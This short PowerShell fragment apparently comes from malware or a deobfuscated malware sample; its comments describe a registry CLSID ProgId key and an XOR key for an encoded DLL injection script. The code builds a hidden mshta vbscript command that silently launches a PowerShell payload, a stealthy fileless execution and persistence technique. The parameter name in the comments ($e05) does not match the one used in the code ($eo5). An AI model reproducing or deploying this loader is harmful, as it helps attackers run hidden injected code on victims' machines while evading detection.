# INPUT PARAMS...
    # $du6, reg key hk(lm|cu):\software\classes\CLSID\<random_GUID_0>\ProgId
    # $zn7, last 4 characters of random_GUID_0
    # $e05, random number 0-254, XOR key for the encoded DLL injection script
# OUTPUT...
    # builds a string containing the shell command that will run mshta -> powershell command produced by sb4 (see sb4-embedded)

("mshta vbscript:execute(`"CreateObject(`"`"Wscript.Shell`"`").Run `"`"" + (sb4 $du6 $zn7 $eo5 $true) + "`"`",0,false:window.close`")") 